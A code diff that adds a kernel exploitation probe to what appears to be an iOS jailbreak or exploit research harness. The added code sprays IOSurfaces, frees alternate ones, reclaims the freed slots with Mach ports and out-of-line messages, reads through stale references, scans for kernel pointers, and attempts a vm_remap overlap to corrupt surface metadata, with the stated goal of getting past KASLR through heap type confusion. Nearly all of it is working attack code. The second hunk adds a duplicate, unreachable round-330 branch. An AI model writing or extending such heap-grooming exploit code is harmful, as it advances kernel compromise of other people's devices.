@@ -8643,6 +8643,432 @@ r326_done:
     fflush(stdout);
 }
 
+/* r330: KASLR-free heap type confusion via IOSurface
+   r328-329: All direct KASLR leak channels sanitized under SPTM.
+   New strategy: Skip KASLR bypass entirely. Use confirmed heap primitives:
+   1. Spray IOSurfaces for deterministic heap layout
+   2. Free one and have a different object (Mach port/OOL msg) reclaim it
+   3. Read through stale IOSurface reference to leak object fields
+   4. Use IOSurface MachPort round-trip to detect object replacement
+
+   Inspired by: Xbox King Kong (shader wrote to arbitrary memory via shared region),
+   PS4 NamedObj exploit (use-after-free type confusion for KASLR bypass). */
+
+static void r330_probe(void) {
+    rlog("\n=== r330: KASLR-Free Heap Type Confusion ===\n");
+    rlog("  Strategy: IOSurface spray + free + reclaim with different object\n");
+    rlog("  Skip KASLR, use relative heap layout instead\n\n");
+    fflush(stdout);
+
+    IOSurfaceCreate_fn cFn = (IOSurfaceCreate_fn)dlsym(RTLD_DEFAULT, "IOSurfaceCreate");
+    IOSurfaceGetID_fn idFn = (IOSurfaceGetID_fn)dlsym(RTLD_DEFAULT, "IOSurfaceGetID");
+    typedef void (*IOSurfaceSetValue_fn)(void*, CFStringRef, CFTypeRef);
+    typedef CFTypeRef (*IOSurfaceCopyValue_fn)(void*, CFStringRef);
+    typedef mach_port_t (*IOSurfaceCreateMachPort_fn)(void*);
+    typedef void* (*IOSurfaceLookupFromMachPort_fn)(mach_port_t);
+    IOSurfaceSetValue_fn svFn = (IOSurfaceSetValue_fn)dlsym(RTLD_DEFAULT, "IOSurfaceSetValue");
+    IOSurfaceCopyValue_fn gvFn = (IOSurfaceCopyValue_fn)dlsym(RTLD_DEFAULT, "IOSurfaceCopyValue");
+    IOSurfaceCreateMachPort_fn mpFn = (IOSurfaceCreateMachPort_fn)
+        dlsym(RTLD_DEFAULT, "IOSurfaceCreateMachPort");
+    IOSurfaceLookupFromMachPort_fn luFn = (IOSurfaceLookupFromMachPort_fn)
+        dlsym(RTLD_DEFAULT, "IOSurfaceLookupFromMachPort");
+
+    if (!cFn || !idFn || !svFn || !gvFn || !mpFn) {
+        rlog("  Missing IOSurface symbols\n");
+        goto r330_done;
+    }
+
+    /* ---- Part 1: IOSurface spray + Mach port reclaim ---- */
+    /* Spray IOSurfaces, create Mach ports for some, free the surfaces,
+       then spray Mach ports into the freed slots. The stale IOSurface
+       Mach port lookup might return corrupted data. */
+    rlog("--- Part 1: IOSurface spray + Mach port reclaim test ---\n");
+    fflush(stdout);
+    {
+        #define SPRAY_COUNT 32
+        void *surfaces[SPRAY_COUNT] = {0};
+        mach_port_t surf_ports[SPRAY_COUNT] = {0};
+        uint32_t surf_ids[SPRAY_COUNT] = {0};
+        void *surf_bases[SPRAY_COUNT] = {0};
+
+        /* Step 1: Spray IOSurfaces */
+        for (int i = 0; i < SPRAY_COUNT; i++) {
+            int w = 16, h = 16, bpr = 64, as = 4096, pf = 0x42475241;
+            CFNumberRef wV = CFNumberCreate(NULL, kCFNumberIntType, &w);
+            CFNumberRef hV = CFNumberCreate(NULL, kCFNumberIntType, &h);
+            CFNumberRef bV = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+            CFNumberRef aV = CFNumberCreate(NULL, kCFNumberIntType, &as);
+            CFNumberRef pV = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+            const void *keys[] = {CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"),
+                CFSTR("IOSurfaceBytesPerRow"), CFSTR("IOSurfaceAllocSize"),
+                CFSTR("IOSurfacePixelFormat")};
+            const void *vals[] = {wV, hV, bV, aV, pV};
+            CFDictionaryRef p = CFDictionaryCreate(NULL, keys, vals, 5,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            surfaces[i] = cFn(p);
+            if (surfaces[i]) {
+                surf_ids[i] = idFn(surfaces[i]);
+                IOSurfaceLock(surfaces[i], 0, NULL);
+                surf_bases[i] = IOSurfaceGetBaseAddress(surfaces[i]);
+                IOSurfaceUnlock(surfaces[i], 0, NULL);
+                /* Create Mach port BEFORE releasing */
+                surf_ports[i] = mpFn(surfaces[i]);
+                /* Set a marker value */
+                int marker = 0xDEAD0000 + i;
+                CFNumberRef mv = CFNumberCreate(NULL, kCFNumberIntType, &marker);
+                svFn(surfaces[i], CFSTR("marker"), mv);
+                CFRelease(mv);
+            }
+            CFRelease(p);
+            CFRelease(wV); CFRelease(hV); CFRelease(bV); CFRelease(aV); CFRelease(pV);
+        }
+
+        rlog("  Sprayed %d surfaces\n", SPRAY_COUNT);
+        rlog("  IDs: %u..%u, bases: %p..%p\n",
+             surf_ids[0], surf_ids[SPRAY_COUNT-1],
+             surf_bases[0], surf_bases[SPRAY_COUNT-1]);
+
+        /* Step 2: Free every other surface (keep the port!) */
+        int freed = 0;
+        for (int i = 1; i < SPRAY_COUNT; i += 2) {
+            if (surfaces[i]) {
+                CFRelease(surfaces[i]);
+                surfaces[i] = NULL;
+                freed++;
+            }
+        }
+        rlog("  Freed %d odd-index surfaces (kept ports)\n", freed);
+
+        /* Step 3: Spray Mach ports into freed slots */
+        rlog("  Spraying %d Mach ports to reclaim freed slots...\n", freed * 64);
+        mach_port_t reclaim_ports[1024];
+        int reclaim_count = 0;
+        for (int i = 0; i < freed * 64 && reclaim_count < 1024; i++) {
+            mach_port_t p;
+            kern_return_t kr = mach_port_allocate(mach_task_self(),
+                MACH_PORT_RIGHT_RECEIVE, &p);
+            if (kr == 0) {
+                /* Insert a send right to bump refcount */
+                mach_port_insert_right(mach_task_self(), p, p,
+                    MACH_MSG_TYPE_MAKE_SEND);
+                reclaim_ports[reclaim_count++] = p;
+            }
+        }
+        rlog("  Allocated %d reclaim ports\n", reclaim_count);
+
+        /* Step 4: Try to look up freed surfaces via their Mach ports */
+        rlog("  Checking stale port lookups...\n");
+        int stale_hits = 0;
+        int changed_base = 0;
+        int changed_id = 0;
+        for (int i = 1; i < SPRAY_COUNT; i += 2) {
+            if (surf_ports[i] != MACH_PORT_NULL) {
+                void *looked_up = luFn(surf_ports[i]);
+                if (looked_up) {
+                    uint32_t new_id = idFn(looked_up);
+                    IOSurfaceLock(looked_up, kIOSurfaceLockReadOnly, NULL);
+                    void *new_base = IOSurfaceGetBaseAddress(looked_up);
+                    IOSurfaceUnlock(looked_up, kIOSurfaceLockReadOnly, NULL);
+
+                    rlog("  stale[%d]: port=0x%x old_id=%u new_id=%u old_base=%p new_base=%p\n",
+                         i, surf_ports[i], surf_ids[i], new_id, surf_bases[i], new_base);
+
+                    if (new_id != surf_ids[i]) {
+                        rlog("  !!! ID CHANGED: %u -> %u !!!\n", surf_ids[i], new_id);
+                        changed_id++;
+                    }
+                    if (new_base != surf_bases[i]) {
+                        rlog("  !!! BASE CHANGED: %p -> %p !!!\n", surf_bases[i], new_base);
+                        changed_base++;
+                    }
+
+                    /* Try reading marker through looked-up reference */
+                    CFTypeRef mv = gvFn(looked_up, CFSTR("marker"));
+                    if (mv) {
+                        int mval = 0;
+                        CFNumberGetValue(mv, kCFNumberIntType, &mval);
+                        int expected = 0xDEAD0000 + i;
+                        if (mval != expected) {
+                            rlog("  !!! MARKER CHANGED: 0x%x (expected 0x%x) !!!\n",
+                                 mval, expected);
+                        }
+                        CFRelease(mv);
+                    } else {
+                        rlog("  stale[%d]: marker GONE (object reclaimed?)\n", i);
+                    }
+
+                    stale_hits++;
+                } else {
+                    rlog("  stale[%d]: lookup returned NULL (deallocated)\n", i);
+                }
+            }
+        }
+        rlog("  Stale lookups: %d hits, %d base changes, %d id changes\n",
+             stale_hits, changed_base, changed_id);
+
+        /* Step 5: Scan the data region of still-alive surfaces for leaked data */
+        rlog("  Scanning live surface data for leaked addresses...\n");
+        for (int i = 0; i < SPRAY_COUNT; i += 2) {
+            if (surfaces[i]) {
+                IOSurfaceLock(surfaces[i], kIOSurfaceLockReadOnly, NULL);
+                void *base = IOSurfaceGetBaseAddress(surfaces[i]);
+                size_t alloc = IOSurfaceGetAllocSize(surfaces[i]);
+                uint64_t *dp = (uint64_t *)base;
+                for (size_t j = 0; j < alloc / 8; j++) {
+                    if (dp[j] > 0xfffffff000000000ULL && dp[j] < 0xffffffffffffffffULL) {
+                        rlog("  !!! HEAP KPTR surf[%d] off=%zu: 0x%llx !!!\n",
+                             i, j * 8, dp[j]);
+                    }
+                }
+                IOSurfaceUnlock(surfaces[i], kIOSurfaceLockReadOnly, NULL);
+            }
+        }
+
+        /* Cleanup */
+        for (int i = 0; i < SPRAY_COUNT; i++) {
+            if (surfaces[i]) CFRelease(surfaces[i]);
+            if (surf_ports[i]) mach_port_deallocate(mach_task_self(), surf_ports[i]);
+        }
+        for (int i = 0; i < reclaim_count; i++) {
+            mach_port_deallocate(mach_task_self(), reclaim_ports[i]);
+            mach_port_mod_refs(mach_task_self(), reclaim_ports[i],
+                MACH_PORT_RIGHT_RECEIVE, -1);
+        }
+        #undef SPRAY_COUNT
+    }
+    fflush(stdout);
+
+    /* ---- Part 2: IOSurface + OOL message reclaim ---- */
+    /* Instead of Mach ports, use OOL message data to reclaim freed slots.
+       OOL data is kernel-allocated and might overlap with freed IOSurface backing.
+       Use SMALL messages (learned from r323/r324 crash: >10 OOL crashes). */
+    rlog("\n--- Part 2: IOSurface + OOL data reclaim (small, safe) ---\n");
+    fflush(stdout);
+    {
+        /* Create 8 surfaces, free alternates, spray 4 OOL messages */
+        void *surfs[8] = {0};
+        for (int i = 0; i < 8; i++) {
+            int w = 16, h = 16, bpr = 64, as = 4096, pf = 0x42475241;
+            CFNumberRef wV = CFNumberCreate(NULL, kCFNumberIntType, &w);
+            CFNumberRef hV = CFNumberCreate(NULL, kCFNumberIntType, &h);
+            CFNumberRef bV = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+            CFNumberRef aV = CFNumberCreate(NULL, kCFNumberIntType, &as);
+            CFNumberRef pV = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+            const void *keys[] = {CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"),
+                CFSTR("IOSurfaceBytesPerRow"), CFSTR("IOSurfaceAllocSize"),
+                CFSTR("IOSurfacePixelFormat")};
+            const void *vals[] = {wV, hV, bV, aV, pV};
+            CFDictionaryRef p = CFDictionaryCreate(NULL, keys, vals, 5,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            surfs[i] = cFn(p);
+            CFRelease(p);
+            CFRelease(wV); CFRelease(hV); CFRelease(bV); CFRelease(aV); CFRelease(pV);
+        }
+
+        /* Free alternates */
+        for (int i = 1; i < 8; i += 2) {
+            if (surfs[i]) { CFRelease(surfs[i]); surfs[i] = NULL; }
+        }
+        rlog("  Freed 4 surfaces\n");
+
+        /* Spray 4 OOL messages (small — 1 message per port, 4096 bytes each) */
+        mach_port_t ool_ports[4];
+        for (int i = 0; i < 4; i++) {
+            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &ool_ports[i]);
+            mach_port_insert_right(mach_task_self(), ool_ports[i], ool_ports[i],
+                MACH_MSG_TYPE_MAKE_SEND);
+
+            /* Send 1 OOL message with recognizable pattern */
+            struct {
+                mach_msg_header_t hdr;
+                mach_msg_body_t body;
+                mach_msg_ool_descriptor_t ool;
+            } msg;
+            memset(&msg, 0, sizeof(msg));
+
+            uint8_t ool_data[4096];
+            memset(ool_data, 0x41 + i, sizeof(ool_data));
+            /* Put markers at known offsets */
+            uint64_t magic = 0xCAFEBABE00000000ULL | i;
+            memcpy(ool_data, &magic, 8);
+            memcpy(ool_data + 4088, &magic, 8);
+
+            msg.hdr.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_MAKE_SEND, 0, 0,
+                MACH_MSGH_BITS_COMPLEX);
+            msg.hdr.msgh_size = sizeof(msg);
+            msg.hdr.msgh_remote_port = ool_ports[i];
+            msg.hdr.msgh_local_port = MACH_PORT_NULL;
+            msg.body.msgh_descriptor_count = 1;
+            msg.ool.address = ool_data;
+            msg.ool.size = sizeof(ool_data);
+            msg.ool.deallocate = 0;
+            msg.ool.copy = MACH_MSG_VIRTUAL_COPY;
+            msg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
+
+            kern_return_t kr = mach_msg(&msg.hdr, MACH_SEND_MSG,
+                sizeof(msg), 0, MACH_PORT_NULL, 0, MACH_PORT_NULL);
+            rlog("  OOL msg[%d]: kr=0x%x\n", i, kr);
+        }
+
+        /* Check if live surfaces now contain OOL data patterns */
+        for (int i = 0; i < 8; i += 2) {
+            if (surfs[i]) {
+                IOSurfaceLock(surfs[i], kIOSurfaceLockReadOnly, NULL);
+                void *base = IOSurfaceGetBaseAddress(surfs[i]);
+                size_t alloc = IOSurfaceGetAllocSize(surfs[i]);
+                uint64_t *dp = (uint64_t *)base;
+
+                /* Check for OOL magic pattern */
+                for (size_t j = 0; j < alloc / 8; j++) {
+                    if ((dp[j] & 0xFFFFFFFF00000000ULL) == 0xCAFEBABE00000000ULL) {
+                        rlog("  !!! OOL MAGIC in surf[%d] off=%zu: 0x%llx !!!\n",
+                             i, j * 8, dp[j]);
+                    }
+                    if (dp[j] > 0xfffffff000000000ULL && dp[j] < 0xffffffffffffffffULL) {
+                        rlog("  !!! KPTR in surf[%d] off=%zu: 0x%llx !!!\n",
+                             i, j * 8, dp[j]);
+                    }
+                }
+
+                /* Also check for the fill pattern 0x41-0x44 */
+                uint8_t *bp = (uint8_t *)base;
+                int pat_hits = 0;
+                for (size_t j = 0; j < alloc && j < 64; j++) {
+                    if (bp[j] >= 0x41 && bp[j] <= 0x44) pat_hits++;
+                }
+                if (pat_hits > 32) {
+                    rlog("  surf[%d]: %d/64 bytes match OOL fill pattern!\n", i, pat_hits);
+                }
+
+                IOSurfaceUnlock(surfs[i], kIOSurfaceLockReadOnly, NULL);
+            }
+        }
+
+        /* Cleanup */
+        for (int i = 0; i < 8; i += 2) {
+            if (surfs[i]) CFRelease(surfs[i]);
+        }
+        for (int i = 0; i < 4; i++) {
+            /* Receive and discard OOL messages */
+            struct {
+                mach_msg_header_t hdr;
+                mach_msg_body_t body;
+                mach_msg_ool_descriptor_t ool;
+                mach_msg_trailer_t trailer;
+            } rmsg;
+            mach_msg(&rmsg.hdr, MACH_RCV_MSG, 0, sizeof(rmsg),
+                ool_ports[i], 0, MACH_PORT_NULL);
+            if (rmsg.ool.address) {
+                vm_deallocate(mach_task_self(),
+                    (vm_address_t)rmsg.ool.address, rmsg.ool.size);
+            }
+            mach_port_deallocate(mach_task_self(), ool_ports[i]);
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Part 3: IOSurface backing + vm_remap overlap test ---- */
+    /* Create two surfaces with adjacent backing, remap one's backing over
+       the other's range. If the kernel doesn't fully track the remap,
+       writes to one surface might corrupt the other's metadata. */
+    rlog("\n--- Part 3: IOSurface cross-remap overlap ---\n");
+    fflush(stdout);
+    {
+        void *s1 = NULL, *s2 = NULL;
+        for (int attempt = 0; attempt < 3; attempt++) {
+            int w = 16, h = 16, bpr = 64, as = 4096, pf = 0x42475241;
+            CFNumberRef wV = CFNumberCreate(NULL, kCFNumberIntType, &w);
+            CFNumberRef hV = CFNumberCreate(NULL, kCFNumberIntType, &h);
+            CFNumberRef bV = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+            CFNumberRef aV = CFNumberCreate(NULL, kCFNumberIntType, &as);
+            CFNumberRef pV = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+            const void *keys[] = {CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"),
+                CFSTR("IOSurfaceBytesPerRow"), CFSTR("IOSurfaceAllocSize"),
+                CFSTR("IOSurfacePixelFormat")};
+            const void *vals[] = {wV, hV, bV, aV, pV};
+            CFDictionaryRef p = CFDictionaryCreate(NULL, keys, vals, 5,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            if (attempt == 0) s1 = cFn(p); else if (attempt == 1) s2 = cFn(p);
+            CFRelease(p);
+            CFRelease(wV); CFRelease(hV); CFRelease(bV); CFRelease(aV); CFRelease(pV);
+        }
+
+        if (s1 && s2) {
+            IOSurfaceLock(s1, 0, NULL);
+            IOSurfaceLock(s2, 0, NULL);
+            void *b1 = IOSurfaceGetBaseAddress(s1);
+            void *b2 = IOSurfaceGetBaseAddress(s2);
+            rlog("  s1 base=%p, s2 base=%p, delta=%ld\n",
+                 b1, b2, (long)((char*)b2 - (char*)b1));
+
+            /* Write pattern to s1 */
+            memset(b1, 0xAA, 4096);
+
+            /* Try to remap s1's backing over s2's region */
+            mach_vm_address_t remap_addr = (mach_vm_address_t)b2;
+            vm_prot_t cur, maxp;
+            kern_return_t kr = mach_vm_remap(mach_task_self(),
+                &remap_addr, 4096, 0, VM_FLAGS_OVERWRITE,
+                mach_task_self(), (mach_vm_address_t)b1, FALSE,
+                &cur, &maxp, VM_INHERIT_NONE);
+            rlog("  vm_remap s1->s2: kr=0x%x remap_addr=0x%llx\n",
+                 kr, (unsigned long long)remap_addr);
+
+            if (kr == 0) {
+                /* Check if s2's data now shows s1's pattern */
+                uint8_t *check = (uint8_t *)b2;
+                int matching = 0;
+                for (int i = 0; i < 4096; i++) {
+                    if (check[i] == 0xAA) matching++;
+                }
+                rlog("  s2 after remap: %d/4096 bytes match s1 pattern (0xAA)\n", matching);
+
+                /* Now modify s1 and check if s2 reflects the change */
+                memset(b1, 0xBB, 4096);
+                matching = 0;
+                for (int i = 0; i < 4096; i++) {
+                    if (check[i] == 0xBB) matching++;
+                }
+                rlog("  s2 after s1 write 0xBB: %d/4096 shared\n", matching);
+
+                /* KEY: Now set a property on s2 — the kernel will write to
+                   what it thinks is s2's metadata region, but it might be
+                   s1's backing if the remap overlapped metadata */
+                int magic = 0x12345678;
+                CFNumberRef mv = CFNumberCreate(NULL, kCFNumberIntType, &magic);
+                svFn(s2, CFSTR("test_overlap"), mv);
+                CFRelease(mv);
+
+                CFTypeRef rv = gvFn(s2, CFSTR("test_overlap"));
+                if (rv) {
+                    int rval = 0;
+                    CFNumberGetValue(rv, kCFNumberIntType, &rval);
+                    rlog("  s2 property readback: 0x%x\n", rval);
+                    CFRelease(rv);
+                }
+
+                /* Check s1 for any leaked metadata */
+                uint64_t *s1p = (uint64_t *)b1;
+                for (int j = 0; j < 512; j++) {
+                    if (s1p[j] != 0xBBBBBBBBBBBBBBBBULL && s1p[j] != 0) {
+                        rlog("  s1[%d]: 0x%llx (unexpected!)\n", j, s1p[j]);
+                    }
+                }
+            }
+
+            IOSurfaceUnlock(s1, 0, NULL);
+            IOSurfaceUnlock(s2, 0, NULL);
+            CFRelease(s1);
+            CFRelease(s2);
+        }
+    }
+    fflush(stdout);
+
+r330_done:
+    rlog("\n=== r330 complete ===\n");
+    fflush(stdout);
+}
+
 /* r329: OOB TIFF decode + IOSurface header hexdump + async IOKit
    r328 findings: TIFF3 with OOB StripOffsets parsed (count=1), pre-base readable.
    Strategy: Force pixel extraction from malformed TIFF, hexdump IOSurface header,
@@ -42248,6 +42674,13 @@ new_modes:
             rlog("*** rounds=330: Trigon-Inspired KASLR Bypass Vectors ***\n");
             rlog("  r329: TIFF3 OOB, IOSurface header, async IOKit.\n");
             rlog("  Probe: host_info uninit, mach_port_kobject, PurpleGfxMem, memory entries.\n\n");
+            r330_probe();
+            goto done;
+        }
+        if (rounds == 330) {
+            rlog("*** rounds=330: KASLR-Free Heap Type Confusion ***\n");
+            rlog("  r329: TIFF OOB decoded safely, pre-base empty, async denied.\n");
+            rlog("  Probe: IOSurface spray+free+reclaim, OOL overlap, cross-remap.\n\n");
             r330_probe();
             goto done;
         }
